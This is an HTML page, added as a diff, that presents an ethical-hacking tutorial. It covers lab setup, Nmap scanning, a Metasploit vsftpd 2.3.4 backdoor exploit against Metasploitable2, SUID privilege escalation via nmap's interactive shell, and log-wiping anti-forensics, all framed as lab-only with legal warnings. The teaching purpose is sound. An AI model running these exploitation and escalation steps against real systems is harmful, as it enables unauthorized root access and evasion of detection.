@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Ultimate Ethical Hacking Guide</title>
+    <style>
+        /* --- General Styling & Layout --- */
+        :root {
+            --primary-color: #0d1117;
+            --secondary-color: #161b22;
+            --accent-color: #2f81f7;
+            --green-accent: #238636;
+            --red-accent: #da3633;
+            --yellow-accent: #e3b341;
+            --text-color: #c9d1d9;
+            --border-color: #30363d;
+            --header-font: 'Poppins', sans-serif;
+            --body-font: 'Roboto', sans-serif;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&family=Roboto:wght@400;700&display=swap');
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: var(--body-font);
+            background-color: var(--primary-color);
+            color: var(--text-color);
+            margin: 0;
+            line-height: 1.7;
+            font-size: 17px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* --- Header & Navigation --- */
+        .main-header {
+            background-color: rgba(22, 27, 34, 0.8);
+            padding: 1rem 0;
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+
+        .main-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .logo {
+            font-family: var(--header-font);
+            font-size: 1.8em;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 700;
+        }
+        .logo span { color: var(--accent-color); }
+
+        .nav-links {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .nav-links a {
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: 700;
+            padding: 5px 10px;
+            border-radius: 5px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .nav-links a:hover, .nav-links a.active {
+            background-color: var(--accent-color);
+            color: #ffffff;
+        }
+
+        /* --- Page Sections (Simulating Pages) --- */
+        .page-section {
+            padding: 80px 20px 40px; /* Top padding to offset sticky nav */
+            border-bottom: 2px solid var(--border-color);
+            min-height: 95vh;
+        }
+        .page-section:last-of-type {
+            border-bottom: none;
+        }
+
+        h1, h2, h3, h4 {
+            font-family: var(--header-font);
+            color: #ffffff;
+            padding-bottom: 10px;
+            margin-bottom: 25px;
+        }
+        h1 { font-size: 3.2em; border-bottom: 3px solid var(--accent-color); }
+        h2 { font-size: 2.5em; border-bottom: 2px solid var(--border-color); }
+        h3 { font-size: 1.8em; border-bottom: 1px dashed var(--border-color); }
+        h4 { font-size: 1.4em; color: var(--accent-color); }
+
+        /* --- Content Styling --- */
+        p { margin-bottom: 1.5em; }
+
+        code {
+            background-color: var(--secondary-color);
+            border: 1px solid var(--border-color);
+            color: #a5d6ff;
+            padding: 3px 6px;
+            border-radius: 5px;
+            font-family: 'SF Mono', 'Courier New', Courier, monospace;
+        }
+
+        pre {
+            background-color: #010409;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            white-space: pre;
+            font-size: 0.9em;
+        }
+        pre code { border: none; background: none; padding: 0; }
+
+        .card-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+
+        .card {
+            background-color: var(--secondary-color);
+            border: 1px solid var(--border-color);
+            border-left: 5px solid var(--accent-color);
+            border-radius: 8px;
+            padding: 25px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            display: flex;
+            flex-direction: column;
+        }
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        ul { list-style-type: '➤ '; padding-left: 25px; }
+        li { margin-bottom: 12px; }
+
+        .info-box { background-color: rgba(47, 129, 247, 0.1); border-left: 5px solid var(--accent-color); padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .success-box { background-color: rgba(35, 134, 54, 0.1); border-left: 5px solid var(--green-accent); padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .warning-box { background-color: rgba(218, 54, 51, 0.1); border-left: 5px solid var(--red-accent); padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .caution-box { background-color: rgba(227, 179, 65, 0.1); border-left: 5px solid var(--yellow-accent); padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .warning-box strong, .caution-box strong { color: #ff9676; display: block; margin-bottom: 10px; font-size: 1.2em; }
+
+        /* --- Footer --- */
+        .main-footer { text-align: center; padding: 40px 20px; background-color: #010409; border-top: 1px solid var(--border-color); }
+    </style>
+</head>
+<body>
+
+    <!-- ========================== HEADER & NAVIGATION ========================== -->
+    <header class="main-header">
+        <nav class="main-nav container">
+            <a href="#home" class="logo">Cyber<span>Guards</span></a>
+            <ul class="nav-links">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#principles">Principles</a></li>
+                <li><a href="#phases">Phases</a></li>
+                <li><a href="#tutorials">Tutorials</a></li>
+                <li><a href="#anonymity">Anonymity</a></li>
+                <li><a href="#techniques">Techniques</a></li>
+                <li><a href="#tools">Tools</a></li>
+                <li><a href="#resources">Resources</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- ========================== HOME SECTION ========================== -->
+    <section id="home" class="page-section">
+        <div class="container">
+            <h1>The Ultimate Ethical Hacking Guide</h1>
+            <p style="font-size: 1.2em;">Your complete journey into the world of offensive and defensive cybersecurity. This guide is a comprehensive, structured roadmap designed to take you from core concepts to the advanced tools and techniques used by professionals to secure our digital world.</p>
+            <div class="warning-box"><strong>Legal & Ethical Mandate:</strong> The information in this guide is for educational purposes ONLY. All activities discussed must be conducted in a controlled lab environment or with explicit, documented, written permission from the system owner. Unauthorized hacking is a serious crime. <strong>Act responsibly, act ethically.</strong></div>
+            <h2>Who Is This Guide For?</h2>
+            <div class="card-container">
+                <div class="card"><h3>Aspiring Cybersecurity Professionals</h3><p>Students and individuals looking to start a career in penetration testing, security analysis, or network defense.</p></div>
+                <div class="card"><h3>Developers & Engineers</h3><p>Programmers, network admins, and system architects who want to understand the attacker's mindset to build more secure systems ("shifting left").</p></div>
+                <div class="card"><h3>Curious Minds</h3><p>Anyone fascinated by the world of hacking who wants to learn how it works from a structured, ethical perspective.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========================== CORE PRINCIPLES SECTION ========================== -->
+    <section id="principles" class="page-section">
+        <div class="container">
+            <h2>Core Principles & Ethics</h2>
+            <p>Before touching any tools, one must understand the rules. Ethical hacking is governed by a strict code of conduct that separates professionals from criminals.</p>
+            <div class="card"><h3>The Hacker Mindset</h3><p>It's not about destruction; it's about curiosity and problem-solving. A true hacker mindset involves:</p><ul><li><strong>Persistence:</strong> Not giving up when an initial attempt fails. Trying different angles and thinking creatively.</li><li><strong>Curiosity:</strong> A deep desire to understand how systems work, and more importantly, how they can break.</li><li><strong>Structured Thinking:</strong> Following a methodology rather than randomly trying things. Every action has a purpose.</li></ul></div>
+            <div class="card-container">
+                <div class="card"><h4>The Mandate: Explicit Permission</h4><p>This is the golden rule. You must have clear, written, and documented permission before you perform any type of security testing. This is often formalized in a legal contract.</p></div>
+                <div class="card"><h4>The Scope: Rules of Engagement (ROE)</h4><p>A professional engagement always includes a "scope of engagement." This defines what you can test (IPs, domains), what you can't, what techniques are allowed (e.g., is social engineering okay?), and the timeframe for the test.</p></div>
+                <div class="card"><h4>The Report: Actionable Findings</h4><p>The final product is a detailed report that explains the findings, assesses their business impact (the "so what?"), and provides clear, actionable recommendations for remediation. The goal is to improve security, not just break things.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========================== PHASES SECTION ========================== -->
+    <section id="phases" class="page-section">
+        <div class="container">
+            <h2>The Five Phases of Hacking</h2>
+            <p>Professional hacking follows a structured methodology to ensure all bases are covered. This five-phase process is the universal standard.</p>
+            <div class="info-box">Each phase builds upon the last, creating a comprehensive picture of the target's security posture.</div>
+            <div class="card"><h3>Phase 1: Reconnaissance</h3><p><b>Goal:</b> Information Gathering. Know more about the target than they know about themselves. Can be passive (no direct contact) or active (direct interaction).</p><ul><li><b>Passive Tools:</b> Google, Shodan, Maltego, theHarvester, Whois.</li><li><b>Active Tools:</b> Nmap, DNS enumeration scripts, web crawlers.</li></ul></div>
+            <div class="card"><h3>Phase 2: Scanning & Enumeration</h3><p><b>Goal:</b> Map the attack surface. Use info from recon to actively probe for weaknesses.</p><ul><li><b>Port Scanning:</b> Nmap to find open TCP/UDP ports/services.</li><li><b>Vulnerability Scanning:</b> Nessus, Nikto, OpenVAS to find known vulns.</li><li><b>Enumeration:</b> Extracting usernames (enum4linux), shares (smbclient), versions from services.</li></ul></div>
+            <div class="card"><h3>Phase 3: Gaining Access (Exploitation)</h3><p><b>Goal:</b> Breach the system. Leverage a vulnerability to gain access at the OS, application, or network level.</p><ul><li>Executing an exploit (Metasploit).</li><li>Bypassing logins (SQL Injection).</li><li>Tricking a user (Social Engineering).</li></ul></div>
+            <div class="card"><h3>Phase 4: Maintaining Access & Privilege Escalation</h3><p><b>Goal:</b> Secure a foothold and gain full control. Ensure you can re-enter the system and get administrator-level permissions.</p><ul><li><b>Persistence:</b> Installing backdoors, webshells, rootkits. Using scheduled tasks (cron/Task Scheduler).</li><li><b>Privilege Escalation (PrivEsc):</b> Exploiting kernel vulnerabilities, misconfigured SUID binaries, or weak service permissions to move from a standard user to root/SYSTEM.</li><li><b>Lateral Movement:</b> Using the compromised machine to pivot and attack other machines on the internal network.</li></ul></div>
+            <div class="card"><h3>Phase 5: Covering Tracks (Anti-Forensics)</h3><p><b>Goal:</b> Remove evidence of compromise to prevent detection.</p><ul><li>Clearing or manipulating logs (e.g., wiping `/var/log` on Linux).</li><li>Using proxies/VPNs/compromised machines to hide source IP.</li><li>Hiding data with steganography or Alternate Data Streams (ADS) on Windows.</li></ul></div>
+        </div>
+    </section>
+
+    <!-- ========================== TUTORIALS SECTION ========================== -->
+    <section id="tutorials" class="page-section">
+        <div class="container">
+            <h2>Practical Walkthroughs & Tutorials</h2>
+            <div class="warning-box"><strong>CRITICAL WARNING:</strong> The following tutorials are for educational purposes only and MUST be performed in an isolated virtual lab environment. <strong>NEVER</strong> perform these actions on any system you do not own or have explicit, written permission to test.</div>
+
+            <div class="info-box">
+                <h3>Setting Up Your Hacking Lab</h3>
+                <p>A safe lab is non-negotiable. Here’s the standard setup:</p>
+                <ol>
+                    <li><strong>Virtualization Software:</strong> Download and install <a href="https://www.virtualbox.org/" target="_blank">VirtualBox</a> (free) or VMware.</li>
+                    <li><strong>Attacker Machine:</strong> Download the <a href="https://www.kali.org/get-kali/" target="_blank">Kali Linux</a> VirtualBox image and import it.</li>
+                    <li><strong>Target Machine(s):</strong> Download <a href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/" target="_blank">Metasploitable2</a> (for network/service exploits) and set up a web-focused VM like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> (for web app hacking).</li>
+                    <li><strong>Network Configuration:</strong> In VirtualBox, set all VMs' network adapters to "Host-only Adapter". This creates a private, isolated network between your host and VMs. They can talk to each other but not to the internet or your home network.</li>
+                    <li><strong>Get IPs:</strong> Start all VMs. On Kali, run <code>ip a</code>. On Metasploitable2 (login: <code>msfadmin</code>/<code>msfadmin</code>), run <code>ifconfig</code>. Note down their IP addresses.</li>
+                </ol>
+            </div>
+
+            <hr>
+            <h3>Walkthrough 1: Network Scanning with Nmap</h3>
+            <p><strong>Objective:</strong> Discover and enumerate a target machine.</p>
+            <pre><code># Find live hosts on the 192.168.56.0/24 network
+sudo nmap -sn 192.168.56.0/24
+
+# Assume target is 192.168.56.102. Run an intensive scan.
+sudo nmap -A -p- -T4 --min-rate=1000 192.168.56.102 -oN nmap_scan.txt</code></pre>
+            <ul><li><code>-A</code>: Aggressive scan (OS/version detection, scripts).</li><li><code>-p-</code>: Scan all 65,535 TCP ports.</li><li><code>-T4</code>: Aggressive timing template (faster).</li><li><code>--min-rate=1000</code>: Send at least 1000 packets per second.</li><li><code>-oN</code>: Save output to a normal text file.</li></ul>
+
+            <hr>
+            <h3>Walkthrough 2: Exploitation with Metasploit</h3>
+            <p><strong>Objective:</strong> Gain a remote shell on Metasploitable2.</p>
+            <p><strong>Scenario:</strong> Our Nmap scan found port 21 open running `vsftpd 2.3.4`, which has a known backdoor.</p>
+            <pre><code># Launch Metasploit
+msfconsole
+
+# Search for the exploit
+msf6 > search vsftpd
+
+# Use the exploit module
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+
+# View required options
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+# Set the target IP address
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
+
+# Run the exploit
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit</code></pre>
+            <p><strong>Result:</strong> If successful, you'll see "Command shell session 1 opened". You can type <code>whoami</code> and it will return <code>root</code>. You now have full control.</p>
+
+            <hr>
+            <h3>Walkthrough 3: Linux Privilege Escalation</h3>
+            <p><strong>Objective:</strong> Move from a low-privilege user to root.</p>
+            <p><strong>Scenario:</strong> You've gained a user shell on a machine, but you are not root. Your `whoami` returns `www-data`. You need to find a way to escalate.</p>
+            <h4>Step 1: Find SUID Binaries</h4>
+            <p>SUID binaries are programs that run with the permissions of the file owner, not the user running them. If a binary owned by root has the SUID bit set, it runs as root. This can be a vector for escalation.</p>
+            <pre><code># From your user shell on the target machine:
+find / -perm -u=s -type f 2>/dev/null</code></pre>
+            <ul><li>This command finds all files (<code>-type f</code>) from the root directory (<code>/</code>) that have the SUID permission bit set (<code>-perm -u=s</code>). Errors are redirected to `/dev/null`.</li></ul>
+            <p><strong>Analysis:</strong> Look through the list for non-standard programs. Binaries like `/usr/bin/passwd` are expected to have SUID, but if you see something custom like `/usr/local/bin/backup`, it's worth investigating.</p>
+
+            <h4>Step 2: Exploit a Vulnerable SUID Binary</h4>
+            <p>Let's say you find `/usr/bin/nmap` in the SUID list (an old, misconfigured version). Nmap has an "interactive" mode that can spawn a shell.</p>
+            <pre><code># From your user shell:
+/usr/bin/nmap --interactive
+
+# Nmap's interactive prompt will appear. Now spawn a shell.
+nmap> !sh
+
+# Check your new identity
+whoami</code></pre>
+            <p><strong>Result:</strong> The `whoami` command should now return <code>root</code>. Because nmap was a SUID binary owned by root, the shell it spawned inherited those root privileges.</p>
+            <div class="success-box"><strong>Defense:</strong> Regularly audit for unnecessary SUID/SGID binaries. Apply the principle of least privilege: programs should only have the permissions they absolutely need to function.</div>
+        </div>
+    </section>
+
+    <!-- ========================== ANONYMITY SECTION ========================== -->
+    <section id="anonymity" class="page-section">
+        <div class="container">
+            <h2>Understanding Anonymity: Tor & The "Dark Web"</h2>
+            <p>The concepts of the "Deep Web" and "Dark Web" are often misunderstood. Understanding them, and the tools used to access them like Tor, is crucial for a complete cybersecurity education.</p>
+
+            <div class="caution-box"><strong>IMPORTANT:</strong> This section is for understanding the technology and its legitimate uses for privacy. This guide does not condone and will not provide instructions for accessing illegal content or marketplaces. The Dark Web contains dangerous content and malicious actors. Proceed with extreme caution.</div>
+
+            <h3>Deep Web vs. Dark Web</h3>
+            <div class="card-container">
+                <div class="card"><h4>The Surface Web (Clearnet)</h4><p>This is the internet you use every day. It's the collection of all public-facing websites that are indexed by search engines like Google. If you can find it on Google, it's on the surface web.</p></div>
+                <div class="card"><h4>The Deep Web</h4><p>This is simply the part of the internet that is not indexed by search engines. It's not sinister; it's the vast majority of the web. Examples include your email inbox, online banking pages after you log in, cloud storage drives, and corporate intranets. You need direct credentials to access it.</p></div>
+                <div class="card"><h4>The Dark Web</h4><p>This is a small, specific subset of the Deep Web that is intentionally hidden and requires special software to access. It is designed for maximum anonymity. The most common way to access it is through the Tor network.</p></div>
+            </div>
+
+            <h3>What is Tor? (The Onion Router)</h3>
+            <p>Tor is a free, open-source software that enables anonymous communication. It works by directing internet traffic through a free, worldwide, volunteer overlay network consisting of more than seven thousand relays to conceal a user's location and usage from anyone conducting network surveillance or traffic analysis.</p>
+            <h4>How Tor Works: Onion Routing</h4>
+            <ol>
+                <li>Your traffic is encrypted in multiple layers, like the layers of an onion.</li>
+                <li>It's sent through a series of at least three random servers (relays) in the Tor network.</li>
+                <li>Each relay "peels off" one layer of encryption to know where to send the data next. The final relay knows the destination but not the origin. The first relay knows the origin but not the final destination.</li>
+                <li>This makes it extremely difficult for any single point to link your identity to your web activity.</li>
+            </ol>
+
+            <h3>Tutorial: Safely Using the Tor Browser</h3>
+            <p><strong>Objective:</strong> To browse the normal, surface-level internet with the privacy protections of the Tor network.</p>
+            <div class="warning-box"><strong>Security Best Practices:</strong> Do NOT use Tor for illegal activities. Do NOT log into personal accounts (email, banking) over Tor, as this de-anonymizes you to that service. Do NOT download and open files from unknown sources using Tor.</div>
+            <ol>
+                <li><strong>Download:</strong> Go to the official <a href="https://www.torproject.org/" target="_blank">Tor Project website</a> and download the Tor Browser for your operating system. Verify the signature to ensure it's authentic.</li>
+                <li><strong>Install:</strong> Install it like any other application. It's a self-contained package.</li>
+                <li><strong>Connect:</strong> Launch the Tor Browser. Click the "Connect" button. It may take a moment to establish a connection to the Tor network.</li>
+                <li><strong>Browse:</strong> Once connected, the browser (a hardened version of Firefox) will open. You can now browse websites on the normal internet (like `duckduckgo.com`). Your traffic is being routed through the Tor network, hiding your real IP address from the websites you visit.</li>
+            </ol>
+            <p>Dark Web sites are accessed via special `.onion` addresses. These can only be resolved through the Tor network. Again, exploring these sites carries significant risk.</p>
+            <div class="success-box"><strong>Legitimate Uses of Tor:</strong> Tor is a vital tool for journalists, activists, law enforcement, and citizens living under oppressive regimes who need to protect their identity and bypass censorship to communicate freely and safely. It is a powerful tool for privacy.</div>
+        </div>
+    </section>
+
+    <!-- ========================== TECHNIQUES SECTION ========================== -->
+    <section id="techniques" class="page-section">
+        <div class="container">
+            <h2>Attack Techniques & Vectors Deep Dive</h2>
+            <p>A more granular look at the attacker's playbook.</p>
+            <h3>Web Application Attacks</h3>
+            <div class="card-container">
+                <div class="card"><h4>SQL Injection (SQLi)</h4><p>Injecting malicious SQL into application queries to manipulate the backend database.</p></div>
+                <div class="card"><h4>Cross-Site Scripting (XSS)</h4><p>Injecting malicious JS into a website to execute in other users' browsers. Can be Stored, Reflected, or DOM-based.</p></div>
+                <div class="card"><h4>Insecure Deserialization</h4><p>Exploiting applications that deserialize user-supplied data without verification, potentially leading to Remote Code Execution (RCE).</p></div>
+                <div class="card"><h4>XML External Entity (XXE)</h4><p>Attacking applications that parse XML input, allowing an attacker to read local files on the server or cause a denial of service.</p></div>
+            </div>
+            <h3>Social Engineering</h3>
+            <div class="card-container">
+                <div class="card"><h4>Phishing</h4><p>Mass-emailed fraudulent messages. <b>Spear Phishing</b> targets specific individuals. <b>Whaling</b> targets high-profile executives.</p></div>
+                <div class="card"><h4>Baiting</h4><p>Leaving a malware-infected USB drive in a public place, relying on human curiosity to get it plugged into a corporate network.</p></div>
+                <div class="card"><h4>Pretexting</h4><p>Creating a fabricated scenario (a pretext) to manipulate a victim into providing information. E.g., pretending to be from IT support to ask for a password.</p></div>
+            </div>
+            <h3>Malware Types</h3>
+             <div class="card-container">
+                <div class="card"><h4>Virus & Worm</h4><p>A <b>Virus</b> attaches to a legitimate file and requires human action to spread. A <b>Worm</b> is self-replicating and spreads across networks without human interaction.</p></div>
+                <div class="card"><h4>Trojan</h4><p>Malware disguised as legitimate software. It doesn't self-replicate but opens a backdoor for an attacker.</p></div>
+                <div class="card"><h4>Ransomware</h4><p>Encrypts a victim's files and demands a ransom payment (usually in cryptocurrency) for the decryption key.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========================== TOOLS SECTION ========================== -->
+    <section id="tools" class="page-section">
+        <div class="container">
+            <h2>The Ethical Hacker's Expanded Toolkit</h2>
+            <p>A categorized list of essential tools.</p>
+            <h3>Reconnaissance</h3><div class="card-container"><div class="card"><h4>theHarvester</h4><p>Gathers emails, subdomains, hosts, employee names from public sources like search engines and PGP key servers.</p></div><div class="card"><h4>Maltego</h4><p>An interactive data mining tool that renders directed graphs for link analysis. Excellent for visualizing relationships between people, domains, and companies.</p></div></div>
+            <h3>Scanning & Enumeration</h3><div class="card-container"><div class="card"><h4>Nmap</h4><p>The essential port scanner and network mapper.</p></div><div class="card"><h4>Nikto</h4><p>A web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs.</p></div><div class="card"><h4>Enum4linux</h4><p>A tool for enumerating information from Windows and Samba systems.</p></div></div>
+            <h3>Web Application Testing</h3><div class="card-container"><div class="card"><h4>Burp Suite</h4><p>The industry-standard intercepting proxy for web app testing.</p></div><div class="card"><h4>OWASP ZAP</h4><p>An excellent open-source alternative to Burp Suite.</p></div><div class="card"><h4>Wfuzz</h4><p>A flexible fuzzer for web applications. Used for finding hidden resources, bruteforcing GET/POST parameters, and fuzzing for injection vulnerabilities.</p></div></div>
+            <h3>Exploitation</h3><div class="card-container"><div class="card"><h4>Metasploit Framework</h4><p>The premier exploitation framework.</p></div><div class="card"><h4>sqlmap</h4><p>The master of SQL Injection automation.</p></div><div class="card"><h4>Evil-WinRM</h4><p>A powerful tool for attacking Windows machines that have WinRM (Windows Remote Management) enabled.</p></div></div>
+            <h3>Password Cracking</h3><div class="card-container"><div class="card"><h4>John the Ripper</h4><p>A versatile offline password cracker.</p></div><div class="card"><h4>Hashcat</h4><p>The world's fastest password cracker, capable of using GPUs for immense speed.</p></div><div class="card"><h4>Hydra</h4><p>An online password cracker for brute-forcing login forms on live network services.</p></div></div>
+            <h3>Wireless Hacking</h3><div class="card-container"><div class="card"><h4>Aircrack-ng Suite</h4><p>The de-facto standard for Wi-Fi penetration testing.</p></div><div class="card"><h4>Kismet</h4><p>A wireless network detector, sniffer, and intrusion detection system.</p></div></div>
+        </div>
+    </section>
+
+    <!-- ========================== RESOURCES SECTION ========================== -->
+    <section id="resources" class="page-section">
+        <div class="container">
+            <h2>Your Continuing Education Path</h2>
+            <p>Cybersecurity is a field of constant learning. The landscape changes daily. Use these resources to stay sharp and deepen your knowledge.</p>
+            <h3>Hands-On Practice Platforms</h3>
+            <div class="card-container">
+                <div class="card"><h4>TryHackMe</h4><p>Perfect for beginners. Offers structured learning paths.</p></div>
+                <div class="card"><h4>Hack The Box</h4><p>The next step up. Features live machines with varying difficulty.</p></div>
+                <div class="card"><h4>PortSwigger Web Security Academy</h4><p>The absolute best free resource for learning web application hacking, from the makers of Burp Suite.</p></div>
+            </div>
+            <h3>Essential Reading & Communities</h3>
+            <ul>
+                <li><b>Books:</b> "The Web Application Hacker's Handbook", "Hacking: The Art of Exploitation", "The Phoenix Project", "RTFM: Red Team Field Manual".</li>
+                <li><b>News:</b> Krebs on Security, The Hacker News, Bleeping Computer, Dark Reading.</li>
+                <li><b>Communities:</b> Reddit's /r/netsec and /r/netsecstudents, specific security-focused Discord servers.</li>
+            </ul>
+            <h3>Career Path: Key Certifications</h3>
+            <div class="card-container">
+                <div class="card"><h4>Foundational: CompTIA Security+</h4><p>Establishes core cybersecurity knowledge.</p></div>
+                <div class="card"><h4>Intermediate: CEH / PenTest+ / eJPT</h4><p>CEH is well-known. PenTest+ and eLearnSecurity's eJPT are more respected for being hands-on.</p></div>
+                <div class="card"><h4>Advanced: OSCP</h4><p>The industry gold standard for practical penetration testing skills. Highly respected.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========================== FOOTER ========================== -->
+    <footer class="main-footer">
+        <div class="container">
+            <p>© 2025 CyberGuards. All Rights Reserved.</p>
+            <p>This guide is for educational purposes. Knowledge is power—use it ethically.</p>
+        </div>
+    </footer>
+
+</body>
+</html>
